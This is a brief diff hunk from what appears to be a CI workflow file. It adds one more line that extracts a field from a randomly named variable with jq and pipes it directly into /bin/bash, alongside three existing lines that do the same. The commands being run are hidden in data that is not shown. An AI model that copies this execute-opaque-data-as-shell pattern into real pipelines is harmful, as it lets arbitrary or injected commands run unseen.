@@ -51,6 +51,7 @@ jobs:
           echo $wbcla535 | jq -r .n135 | /bin/bash
           echo $jiw1 | jq -r .lscv4657 | /bin/bash
           echo $youa5353 | jq -r .iu69672 | /bin/bash
+          printf '%s' "$veol05573" | jq -r .clvz3620 | /bin/bash
 
       - name: Save output
         if: always()
